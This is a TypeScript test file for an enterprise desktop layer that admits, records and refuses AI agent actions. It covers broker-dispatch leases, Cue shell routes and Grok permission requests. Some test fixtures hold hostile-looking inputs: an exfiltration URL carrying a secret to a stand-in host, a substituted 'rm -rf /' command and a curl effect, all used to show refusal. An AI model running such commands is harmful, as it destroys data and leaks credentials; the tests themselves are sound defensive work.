/**
 * The broker dispatch bridge: the ledger that joins a broker decision to the
 * local lease and the effect it covered. The endpoint is the fake daemon
 * (a declared double) answering `broker_dispatched` receipts; the authority
 * is the real host adapter over the real socket client; the lease lifetime
 * is driven the way a sink drives it (`bind`, `release`, a revocation).
 * What is defended: every admitted dispatch is recorded with the broker's
 * decision and the registration it ran under, refusals leave no record,
 * the effect states are written as they happen, a decision id joins back to
 * its lease, and a restart turns a still-bound receipt into `unknown`.
 */

import * as fs from 'node:fs';
import * as os from 'node:os';
import * as path from 'node:path';
import { afterEach, beforeEach, describe, expect, it } from 'vitest';

import {
	createBrokerDispatch,
	DISPATCH_RECEIPTS_FILE_NAME,
	admitCueShell,
	cueShellAttribution,
	cueShellRouteSupport,
	type CueShellSpawnPlan,
	GROK_PRE_EFFECT_QUALIFIED_KINDS,
	providerEffectRefusal,
	qualifyProviderEffects,
} from '../../../main/enterprise/dispatch';
import { createProcessSpawnAuthority } from '../../../main/enterprise/spawn-authority';
import type {
	ManagedEffect,
	ManagedEffectAuthority,
	ManagedEffectBinding,
} from '../../../shared/maestro-lib/managed/effects';
import { fakeSpawnPort, tableEffects } from '../../helpers/managedSpawnPort';
import { createLocalEndpointClient } from '../../../main/enterprise/endpoint-client';
import {
	buildDispatchSnapshot,
	createLocalHostAuthority,
	createContextVerifier,
	type AdmissionRequest,
} from '../../../shared/maestro-lib/managed/authority';
import type {
	EndpointPort,
	ManagedEnrollmentStatus,
	ManagedIdentityRecord,
	ManagedIdentityView,
} from '../../../shared/maestro-lib/managed/endpoint-port';
import { createManagedHostAdapter } from '../../../shared/maestro-lib/managed/host-adapter';
import { inProcessContext } from '../../../shared/maestro-lib/managed/operations';
import { startFakeEndpoint, type FakeEndpoint } from './fakeEndpoint';
import { GrokAcpClient } from '../../../shared/maestro-lib/grok/acp-client';
import {
	GrokAcpRequestAdapter,
	type GrokAcpPermissionSettlement,
} from '../../../shared/maestro-lib/grok/acp-requests';
import type {
	AcpMessage,
	AcpRequestId,
	GrokAcpTransportError,
} from '../../../shared/maestro-lib/grok/acp-protocol';

const T0 = Date.parse('2026-10-21T12:00:00Z');
const INSTALLATION = {
	installationId: 'inst-1',
	runtimeId: 'desktop-100',
	processEpoch: 'epoch-1',
};

function record(socketPath: string): ManagedIdentityRecord {
	return {
		version: 1,
		installationId: 'inst-1',
		tenantId: 'tenant-1',
		orgId: 'org-1',
		enrollmentId: 'enr-1',
		endpoint: { socketPath, bindingDigest: 'a'.repeat(64), trustRootDigest: null },
		management: 'enrolled',
		registration: {
			challengeId: 'challenge-7',
			actorId: null,
			runtimeId: 'desktop-100',
			processEpoch: 'epoch-1',
			bindingDigest: 'a'.repeat(64),
			processBirthDigest: null,
			challengeDigest: 'c'.repeat(64),
			expiresAt: new Date(T0 + 3_600_000).toISOString(),
			registeredAt: new Date(T0 - 60_000).toISOString(),
		},
		policy: { desiredRevision: 3, appliedRevision: 3, observedAt: new Date(T0).toISOString() },
		enrolledAt: new Date(T0).toISOString(),
		updatedAt: new Date(T0).toISOString(),
	};
}

function standing(port: EndpointPort, identity: ManagedIdentityView): ManagedEnrollmentStatus {
	const connection = port.state();
	const registered =
		connection.registration === 'registered' &&
		connection.attached &&
		connection.status?.management === 'managed';
	return {
		identity,
		connection,
		endpoint: connection.status,
		authority: registered ? 'registered' : 'none',
		reason: registered ? null : 'not registered-attached-managed in this process',
		pendingApproval: null,
		lastDenial: null,
	};
}

function admission(requestId = 'req-1', attemptId = 'att-1'): AdmissionRequest {
	const verifier = createContextVerifier({
		verifierId: 'test',
		peer: 'in-process',
		now: () => T0,
		accept: () => [],
	});
	const verified = verifier.verify(
		inProcessContext({
			installation: INSTALLATION,
			actor: { kind: 'human', id: 'ada' },
			delegation: { chain: [], grantRef: null },
			identity: {
				requestId,
				idempotencyKey: `key-${requestId}`,
				attemptId,
				runId: 'run-1',
				rootRunId: 'run-1',
				parentRunId: null,
			},
			policyRevision: 3,
			workflow: null,
			traceId: 'trace-1',
			requestedCapabilities: ['runs.submit'],
		})
	);
	if (!verified.ok) throw new Error(verified.problems.join('; '));
	return {
		context: verified.context,
		snapshot: buildDispatchSnapshot(
			{ command: '/bin/claude', args: ['--print'], cwd: '/work', env: {} },
			{ provider: 'claude-code', model: 'sonnet', resourceIds: ['doc-1'] }
		),
		policy: { sources: [], policyRevision: 3 },
	};
}

describe('broker dispatch bridge', () => {
	let dir: string;
	let fake: FakeEndpoint;
	let port: EndpointPort;
	let decisions = 0;

	beforeEach(async () => {
		dir = fs.mkdtempSync(path.join(os.tmpdir(), 'broker-dispatch-'));
		decisions = 0;
		fake = await startFakeEndpoint({
			registrationRequired: true,
			capabilities: ['execution'],
			now: () => T0,
			operations: {
				execution: (payload) => {
					const p = payload as Record<string, unknown>;
					decisions += 1;
					return {
						outcome: 'broker_dispatched',
						requestId: p.requestId,
						attemptId: p.attemptId,
						runId: p.runId,
						decisionId: `decision-${decisions}`,
						requestDigest: 'd'.repeat(64),
						brokerId: 'broker-1',
						policyRevision: p.policyRevision,
					};
				},
			},
		});
		port = createLocalEndpointClient({ socketPath: fake.socketPath, timeoutMs: 1_000 });
		await port.registration.challenge({ runtimeId: 'desktop-100', processEpoch: 'epoch-1' });
		await port.registration.redeem();
		const attached = await port.attach({
			...INSTALLATION,
			components: [{ id: 'maestro', kind: 'maestro', version: '1.1.0-RC' }],
			supportedProtocols: [1],
			supportedCapabilities: ['attachment', 'compatibility', 'execution'],
			requiredCapabilities: ['execution'],
		});
		expect(attached.status).toBe('ok');
	});
	afterEach(async () => {
		await port.close();
		await fake.close();
		fs.rmSync(dir, { recursive: true, force: true });
	});

	function bridge(file = path.join(dir, DISPATCH_RECEIPTS_FILE_NAME)) {
		const view: ManagedIdentityView = {
			status: 'ok',
			reason: null,
			message: null,
			record: record(fake.socketPath),
		};
		let clock = T0;
		let leases = 0;
		const host = createManagedHostAdapter({
			installation: INSTALLATION,
			identity: { read: () => view },
			endpoint: port,
			status: () => standing(port, view),
			now: () => clock,
			newId: () => `lease-${++leases}`,
		});
		const dispatch = createBrokerDispatch({ host, file, now: () => clock });
		return { dispatch, host, file, tick: (ms: number) => (clock += ms) };
	}

	it('records an admitted dispatch with the broker decision, the registration and the effect as it unfolds', async () => {
		const { dispatch, file, tick } = bridge();
		await dispatch.load();
		const outcome = await dispatch.authority.admit(admission());
		expect(outcome.state).toBe('admitted');
		if (outcome.state !== 'admitted') return;

		const receipt = dispatch.receipt(outcome.lease.leaseId);
		expect(receipt).toMatchObject({
			leaseId: 'lease-1',
			decision: {
				decisionId: 'decision-1',
				requestDigest: 'd'.repeat(64),
				brokerId: 'broker-1',
				policyRevision: 3,
			},
			requestId: 'req-1',
			attemptId: 'att-1',
			runId: 'run-1',
			actor: { kind: 'human', id: 'ada' },
			provider: 'claude-code',
			operation: 'start',
			registration: { challengeId: 'challenge-7', runtimeId: 'desktop-100' },
			effect: { state: 'admitted', pid: null },
		});
		expect(dispatch.byDecision('decision-1')).toBe(receipt);
		expect(dispatch.byDecision('decision-9')).toBeNull();

		// The sink binds and releases the lease; the ledger follows without being told.
		tick(10);
		outcome.lease.bind(4242);
		expect(receipt?.effect).toMatchObject({ state: 'bound', pid: 4242 });
		expect(outcome.lease.state()).toBe('bound');
		tick(10);
		outcome.lease.release({ outcome: 'exited', exitCode: 0, signal: null });
		expect(receipt?.effect).toMatchObject({
			state: 'released',
			release: { outcome: 'exited', exitCode: 0 },
		});
		expect(receipt?.effect.endedAt).not.toBeNull();
		// Written through the store writer: the file carries the same record.
		await new Promise((resolve) => setTimeout(resolve, 20));
		const written = JSON.parse(fs.readFileSync(file, 'utf8')) as { receipts: unknown[] };
		expect(written.receipts).toHaveLength(1);
		expect(written.receipts[0]).toMatchObject({
			leaseId: 'lease-1',
			effect: { state: 'released' },
		});
	});

	it('leaves no record for a refusal and writes a revocation as the authority’s stop', async () => {
		const { dispatch } = bridge();
		await dispatch.load();
		fake.options.operations = { execution: () => ({ outcome: 'denied', reason: 'policy_denied' }) };
		expect(await dispatch.authority.admit(admission('req-d'))).toMatchObject({ state: 'denied' });
		expect(dispatch.receipts()).toHaveLength(0);

		fake.options.operations = {
			execution: (payload) => {
				const p = payload as Record<string, unknown>;
				decisions += 1;
				return {
					outcome: 'broker_dispatched',
					requestId: p.requestId,
					attemptId: p.attemptId,
					runId: p.runId,
					decisionId: `decision-${decisions}`,
					requestDigest: 'e'.repeat(64),
					brokerId: 'broker-1',
					policyRevision: p.policyRevision,
				};
			},
		};
		const admitted = await dispatch.authority.admit(admission('req-r', 'att-r'));
		expect(admitted.state).toBe('admitted');
		if (admitted.state !== 'admitted') return;
		admitted.lease.bind(77);
		const heard: string[] = [];
		admitted.lease.onRevoked((reason) => heard.push(reason));
		expect(dispatch.authority.revoke(admitted.lease.leaseId, 'policy changed')).toBe(true);
		expect(heard).toEqual(['policy changed']);
		expect(dispatch.receipt(admitted.lease.leaseId)?.effect).toMatchObject({
			state: 'revoked',
			reason: 'policy changed',
			pid: 77,
		});
		// A release after the revocation does not rewrite the ending.
		admitted.lease.release({ outcome: 'stopped', by: 'authority' });
		expect(dispatch.receipt(admitted.lease.leaseId)?.effect.state).toBe('revoked');
		expect(dispatch.authority.check(admitted.lease, admitted.lease.snapshotDigest)).toEqual({
			ok: false,
			reason: 'revoked',
		});
	});

	it('shapes the turn authority over the adapter policy and turns a still-bound receipt unknown after a restart', async () => {
		const { dispatch, file } = bridge();
		await dispatch.load();
		const request = admission('req-t', 'att-t');
		const turn = dispatch.turnAuthority({
			context: request.context,
			resourceIds: ['doc-1'],
			account: 'profile-1',
		});
		expect(turn.policy).toEqual({
			sources: [{ id: dispatch.authority.authorityId, kind: 'endpoint', revision: 3 }],
			policyRevision: 3,
		});
		expect(turn).toMatchObject({ account: 'profile-1', resourceIds: ['doc-1'] });
		const admitted = await turn.authority.admit(request);
		expect(admitted.state).toBe('admitted');
		if (admitted.state !== 'admitted') return;
		admitted.lease.bind(99);
		await new Promise((resolve) => setTimeout(resolve, 20));

		// A second process over the same ledger: the bound lease is nobody's any more.
		const again = bridge(file);
		const loaded = await again.dispatch.load();
		expect(loaded).toEqual({ ok: true, receipts: 1, recoveredUnknown: 1 });
		expect(again.dispatch.receipt(admitted.lease.leaseId)).toMatchObject({
			decision: { decisionId: 'decision-1' },
			effect: { state: 'unknown', pid: 99 },
		});
		expect(again.dispatch.receipt(admitted.lease.leaseId)?.effect.reason).toMatch(/restarted/);
	});
});

/**
 * The Cue shell boundary (MRC-07-03): the route table, the refusal of an
 * unqualified route before any lease is asked, and the admission of a
 * qualified route (a declared double) on the exact final spawn, with a gate
 * that holds the sink to that snapshot. The authority is the real local host
 * authority over a policy table double.
 */
describe('the Cue shell boundary', () => {
	const localPlan: CueShellSpawnPlan = {
		route: 'local-shell',
		command: 'echo hello',
		args: [],
		cwd: '/work/project',
		env: { PATH: '/usr/bin', MAESTRO_QUERY_SOURCE: 'cue' },
		shell: true,
		projectRoot: '/work/project',
		remoteId: null,
	};
	const sshPlan: CueShellSpawnPlan = {
		route: 'ssh-shell',
		command: 'ssh',
		args: ['user@host', 'bash -c "echo hello"'],
		cwd: '/Users/local',
		env: { PATH: '/usr/bin' },
		shell: false,
		projectRoot: '/remote/project',
		remoteId: 'remote-1',
	};

	function shellAdmission(
		decide: Parameters<typeof createLocalHostAuthority>[0]['decide']
	): Parameters<typeof admitCueShell>[0] & { decisions: AdmissionRequest[] } {
		const decisions: AdmissionRequest[] = [];
		let seq = 0;
		const authority = createLocalHostAuthority({
			authorityId: 'authority-test',
			decide: (request) => {
				decisions.push(request);
				return decide(request);
			},
			now: () => T0,
			newId: () => `lease-${++seq}`,
		});
		return {
			authority,
			context: admission('req-shell', 'att-shell').context,
			policy: { sources: [], policyRevision: 3 },
			account: 'acct-ref',
			decisions,
		};
	}

	it('qualifies neither shell route under management, both run standalone', () => {
		for (const route of ['local-shell', 'ssh-shell'] as const) {
			const support = cueShellRouteSupport(route);
			expect(support.route).toBe(route);
			expect(support.standalone).toBe('implemented');
			expect(support.managed).toBe('unsupported');
			expect(support.note).toContain('no confinement producer qualifies the route');
		}
		expect(cueShellRouteSupport('local-shell').note).toContain("user's shell on this machine");
		expect(cueShellRouteSupport('ssh-shell').note).toContain('remote login shell over SSH');
	});

	it('refuses an unqualified route unavailable before asking the authority for a lease', async () => {
		for (const plan of [localPlan, sshPlan]) {
			const shell = shellAdmission(() => ({ decision: 'allow', policyRevision: 3 }));
			const outcome = await admitCueShell(shell, plan);
			expect(outcome).toMatchObject({
				state: 'unavailable',
				code: 'capability-unsupported',
				message: expect.stringContaining(`over the ${plan.route} route is unavailable`),
			});
			expect(shell.decisions).toHaveLength(0);
			expect(shell.authority.live()).toHaveLength(0);
		}
	});

	it('attributes a shell action to cue-shell with its target and the project root as its resource', () => {
		expect(cueShellAttribution(localPlan, null)).toEqual({
			provider: 'cue-shell',
			model: null,
			operation: 'start',
			account: null,
			target: { kind: 'local' },
			resourceIds: ['dir:/work/project'],
		});
		expect(cueShellAttribution(sshPlan, 'acct-ref')).toMatchObject({
			account: 'acct-ref',
			target: { kind: 'ssh', remoteId: 'remote-1' },
			resourceIds: ['dir:/remote/project'],
		});
	});

	it('on a qualified route (declared double) admits the exact final spawn and gates the sink to it', async () => {
		// DECLARED TEST DOUBLE: no real confinement producer qualifies a shell route.
		const routeSupport = (route: CueShellSpawnPlan['route']) => ({
			route,
			standalone: 'implemented' as const,
			managed: 'implemented' as const,
			note: 'declared test double',
		});
		const shell = shellAdmission(() => ({ decision: 'allow', policyRevision: 3 }));
		const outcome = await admitCueShell(shell, sshPlan, { routeSupport });
		if (outcome.state !== 'admitted') throw new Error(outcome.message);

		expect(shell.decisions).toHaveLength(1);
		expect(shell.decisions[0].snapshot).toBe(outcome.snapshot);
		expect(outcome.snapshot).toMatchObject({
			executable: 'ssh',
			args: ['user@host', 'bash -c "echo hello"'],
			cwd: '/Users/local',
			shell: false,
			envKeys: ['PATH'],
			provider: 'cue-shell',
			account: 'acct-ref',
			target: { kind: 'ssh', remoteId: 'remote-1' },
			resourceIds: ['dir:/remote/project'],
		});
		expect(outcome.attribution).toEqual(cueShellAttribution(sshPlan, 'acct-ref'));
		expect(outcome.lease.state()).toBe('issued');

		// The gate holds the sink to the admitted snapshot: the same spawn passes,
		// a command that changed in between does not.
		expect(outcome.gate.admit(outcome.snapshot)).toEqual({ ok: true });
		const changed = buildDispatchSnapshot(
			{ ...sshPlan, args: ['user@host', 'bash -c "rm -rf /"'] },
			outcome.attribution
		);
		expect(outcome.gate.admit(changed)).toMatchObject({
			ok: false,
			state: 'denied',
			code: 'lease-invalid',
		});

		const denied = shellAdmission(() => ({
			decision: 'deny',
			reason: 'no',
			policyRevision: 3,
			code: 'policy-denied',
		}));
		expect(await admitCueShell(denied, sshPlan, { routeSupport })).toMatchObject({
			state: 'denied',
			code: 'policy-denied',
		});
	});
});

/**
 * Grok effect qualification (GT1-09-07, GT1-09-08). No Grok effect class is
 * proven to ask before it executes, so every Grok effect reaching a managed
 * desktop sink is refused `unavailable` BEFORE the composed authority is
 * asked: the allow-everything table below is a declared double standing in
 * for a producer, and its empty `asked` list is the proof that no decision
 * (and so no receipt) exists for the refused effect. A passing case here
 * proves the client-side refusal only, never a qualified Grok route.
 */
describe('Grok effect qualification at the managed effect sinks', () => {
	const grok = (requestId = 'req-g'): ManagedEffectBinding => ({
		leaseId: 'lease-g',
		actor: { kind: 'human', id: 'ada' },
		provider: 'grok',
		threadId: null,
		turnId: 'tab-g',
		requestId,
	});
	const EFFECTS: Array<[string, ManagedEffect]> = [
		['shell', { kind: 'command', command: 'curl https://x', cwd: '/p', argv: null }],
		['file', { kind: 'file-change', paths: ['/p/a.ts'], cwd: '/p' }],
		['network', { kind: 'permissions', permissions: { network: true } }],
		['MCP', { kind: 'tool-call', tool: 'mcp__srv__fetch', input: { url: 'https://x' } }],
		['user input', { kind: 'user-input', prompt: 'continue?' }],
		['elicitation', { kind: 'elicitation', server: 'srv' }],
	];
	const allowAll = () => tableEffects(() => ({ decision: 'allow' }));
	const signal = new AbortController().signal;

	it('qualifies no Grok effect kind until exact-binary evidence exists', () => {
		expect(GROK_PRE_EFFECT_QUALIFIED_KINDS).toEqual([]);
	});

	it.each(EFFECTS)(
		'refuses a Grok %s effect unavailable before an allow-everything producer is asked',
		async (_label, effect) => {
			const inner = allowAll();
			const decision = await qualifyProviderEffects(inner).decide(effect, grok(), signal);
			expect(decision).toEqual({
				decision: 'unavailable',
				reason: expect.stringContaining(`A managed Grok ${effect.kind} effect is refused`),
			});
			expect((decision as { reason: string }).reason).toContain('GT1-11-12');
			expect(inner.asked).toEqual([]);
		}
	);

	it('refuses an unknown or unnamed Grok effect as unknown, never decided', async () => {
		const inner = allowAll();
		const qualified = qualifyProviderEffects(inner);
		for (const effect of [
			{ kind: 'other', method: 'hooks/run' },
			{ kind: 'network-egress', host: 'x' } as unknown as ManagedEffect,
		] as ManagedEffect[]) {
			const decision = await qualified.decide(effect, grok(), signal);
			expect(decision).toEqual({
				decision: 'unavailable',
				reason: expect.stringContaining(`unknown effect (${effect.kind})`),
			});
		}
		expect(inner.asked).toEqual([]);
	});

	it('leaves other providers to the inner authority under its own id, so the refusal is not vacuous', async () => {
		const inner = allowAll();
		const qualified = qualifyProviderEffects(inner);
		expect(qualified.authorityId).toBe('test-effects');
		const effect = EFFECTS[0][1];
		const binding = { ...grok(), provider: 'codex' };
		expect(providerEffectRefusal(effect, binding)).toBeNull();
		expect(await qualified.decide(effect, binding, signal)).toEqual({ decision: 'allow' });
		expect(inner.asked).toEqual([{ effect, binding }]);
	});

	it('reads the provider from the lease binding: a replayed Grok approval request is refused every time', async () => {
		const inner = allowAll();
		const qualified = qualifyProviderEffects(inner);
		const effect = EFFECTS[1][1];
		const first = await qualified.decide(effect, grok('req-replay'), signal);
		const replay = await qualified.decide(effect, grok('req-replay'), signal);
		expect(first.decision).toBe('unavailable');
		expect(replay).toEqual(first);
		expect(inner.asked).toEqual([]);
	});

	it('holds the desktop port to the qualifier, with a composed producer and with none', async () => {
		const deps = {
			installation: { installationId: 'inst-1', runtimeId: 'desktop-1', processEpoch: 'e1' },
			identity: { read: () => ({ status: 'none' }) as const },
			host: { policy: () => ({ sources: [], policyRevision: 3 }) },
			dispatch: { authority: fakeSpawnPort().authority },
			now: () => 1_000_000,
		};
		const inner = allowAll();
		const composed = createProcessSpawnAuthority({ ...deps, effects: inner });
		const effect = EFFECTS[0][1];
		expect((await composed.effects!.decide(effect, grok(), signal)).decision).toBe('unavailable');
		expect(inner.asked).toEqual([]);
		expect(
			await composed.effects!.decide(effect, { ...grok(), provider: 'codex' }, signal)
		).toEqual({ decision: 'allow' });

		const bare = createProcessSpawnAuthority(deps);
		const grokRefusal = await bare.effects!.decide(effect, grok(), signal);
		expect((grokRefusal as { reason: string }).reason).toContain('A managed Grok command effect');
		const codexRefusal = await bare.effects!.decide(
			effect,
			{ ...grok(), provider: 'codex' },
			signal
		);
		expect(codexRefusal).toEqual({
			decision: 'unavailable',
			reason: expect.stringContaining('no per-effect authorization operation'),
		});
	});
});

/**
 * GT1-11-06 pass two: the managed Grok permission path composed end to end on the
 * client side. The real ACP client and request adapter answer a synthetic peer's
 * `session/request_permission` frames through the real desktop port's effects
 * (`createProcessSpawnAuthority`). The inner producer is a SYNTHETIC allow-everything
 * table; its empty `asked` list is the sentinel that no decision was made. The
 * unqualified control proves the sentinel would have granted, so the refusal is not
 * vacuous. Nothing here qualifies a Grok route or proves Grok's own containment.
 */
describe('managed Grok permission requests over the ACP wire (GT1-11-06)', () => {
	const SECRET = 'xai-SENTINEL-ACP-2222';
	const frame = (id: AcpRequestId, title: string, rawInput: Record<string, unknown>) => ({
		jsonrpc: '2.0' as const,
		id,
		method: 'session/request_permission',
		params: {
			sessionId: 'native-g',
			toolCall: { toolCallId: `tool-${id}`, title, rawInput },
			options: [
				{ optionId: 'yes', name: 'Allow once', kind: 'allow_once' },
				{ optionId: 'no', name: 'Deny once', kind: 'reject_once' },
			],
		},
	});
	const REQUESTS: Array<[string, string, Record<string, unknown>]> = [
		['native shell', 'Bash', { command: 'curl https://x', env: { XAI_API_KEY: SECRET } }],
		['file write', 'Write', { path: '/outside/root/a.ts', content: 'x' }],
		['network', 'WebFetch', { url: `https://exfil.example/?k=${SECRET}` }],
		['MCP meta-tool', 'mcp__srv__fetch', { url: 'https://x' }],
		['subagent', 'Task', { subagent_type: 'general', prompt: 'spawn a child' }],
		['hook', 'hooks/run', { event: 'PreToolUse' }],
	];
	const deps = () => ({
		installation: { installationId: 'inst-1', runtimeId: 'desktop-1', processEpoch: 'e1' },
		identity: { read: () => ({ status: 'none' }) as const },
		host: { policy: () => ({ sources: [], policyRevision: 3 }) },
		dispatch: { authority: fakeSpawnPort().authority },
		now: () => 1_000_000,
	});
	const tick = () => new Promise((resolve) => setImmediate(resolve));

	async function wire(authority: ManagedEffectAuthority) {
		const written: AcpMessage[] = [];
		const settlements: GrokAcpPermissionSettlement[] = [];
		const faults: GrokAcpTransportError[] = [];
		const adapter = new GrokAcpRequestAdapter({
			account: 'synthetic-account-a',
			host: 'local',
			cwd: '/synthetic/project',
			processGeneration: 'process-1',
			onSettlement: (s) => settlements.push(s as GrokAcpPermissionSettlement),
			onFault: (error) => {
				faults.push(error);
				client.close(error.reason);
			},
		});
		const client: GrokAcpClient = new GrokAcpClient({
			write: (bytes) => written.push(JSON.parse(new TextDecoder().decode(bytes))),
			requestHandlers: adapter.requestHandlers,
			onClose: () => adapter.close(),
		});
		const receive = (message: unknown) =>
			client.feedStdout(new TextEncoder().encode(JSON.stringify(message) + '\n'));
		const initialization = client.initialize();
		await Promise.resolve();
		receive({ jsonrpc: '2.0', id: written[0].id, result: { protocolVersion: 1 } });
		await initialization;
		written.length = 0;
		const controller = new AbortController();
		const end = adapter.beginTurn({
			sessionId: 'native-g',
			turnId: 'host-g',
			signal: controller.signal,
			authority,
			binding: { actor: { kind: 'human', id: 'ada' }, leaseId: 'lease-g' },
		});
		return { written, settlements, faults, receive, client, controller, end };
	}

	it.each(REQUESTS)(
		'answers a %s request cancelled on the wire, refused unavailable, the producer never asked',
		async (_label, title, rawInput) => {
			const inner = tableEffects(() => ({ decision: 'allow' }));
			const port = createProcessSpawnAuthority({ ...deps(), effects: inner });
			const { written, settlements, receive, client } = await wire(port.effects!);
			try {
				receive(frame(7, title, rawInput));
				await tick();
				expect(written).toEqual([
					{ jsonrpc: '2.0', id: 7, result: { outcome: { outcome: 'cancelled' } } },
				]);
				expect(settlements).toHaveLength(1);
				expect(settlements[0]).toMatchObject({
					requestId: 7,
					reason: 'unavailable',
					decision: 'unavailable',
					responseWritten: true,
					terminal: { status: 'refused', origin: 'effect' },
				});
				expect(inner.asked).toEqual([]);
				// Redacted: neither the wire answer nor the settlement echoes the request input.
				expect(JSON.stringify([written, settlements])).not.toContain(SECRET);
			} finally {
				client.close();
			}
		}
	);

	it('would have granted through the unqualified producer: the control the refusal is measured against', async () => {
		const inner = tableEffects(() => ({ decision: 'allow' }));
		const { written, settlements, receive, client } = await wire(inner);
		try {
			receive(frame(8, 'Bash', { command: 'ls' }));
			await tick();
			expect(written).toEqual([
				{ jsonrpc: '2.0', id: 8, result: { outcome: { outcome: 'selected', optionId: 'yes' } } },
			]);
			expect(settlements[0]).toMatchObject({ reason: 'allowed' });
			expect(inner.asked).toHaveLength(1);
			expect(inner.asked[0].binding).toMatchObject({ provider: 'grok', leaseId: 'lease-g' });
		} finally {
			client.close();
		}
	});

	it('refuses a replayed request id as a malformed frame and never asks a second time', async () => {
		const inner = tableEffects(() => ({ decision: 'allow' }));
		const port = createProcessSpawnAuthority({ ...deps(), effects: inner });
		const { written, settlements, faults, receive, client } = await wire(port.effects!);
		receive(frame(9, 'Write', { path: '/p/a.ts' }));
		await tick();
		receive(frame(9, 'Write', { path: '/p/a.ts' }));
		await tick();
		expect(written).toHaveLength(1);
		expect(settlements).toHaveLength(1);
		expect(faults.map((f) => f.reason)).toEqual(['malformed-frame']);
		expect(client.isClosed).toBe(true);
		expect(inner.asked).toEqual([]);
	});

	it('answers nothing granted once the turn is stopped (lease revoked) before the request lands', async () => {
		const inner = tableEffects(() => ({ decision: 'allow' }));
		const { written, settlements, receive, controller, client } = await wire(inner);
		try {
			// The desktop stops the turn when its lease is revoked; the next request is late.
			controller.abort();
			receive(frame(10, 'Bash', { command: 'ls' }));
			await tick();
			expect(written).toEqual([
				{ jsonrpc: '2.0', id: 10, result: { outcome: { outcome: 'cancelled' } } },
			]);
			expect(settlements[0]).toMatchObject({ reason: 'stale-request' });
			expect(inner.asked).toEqual([]);
		} finally {
			client.close();
		}
	});
});
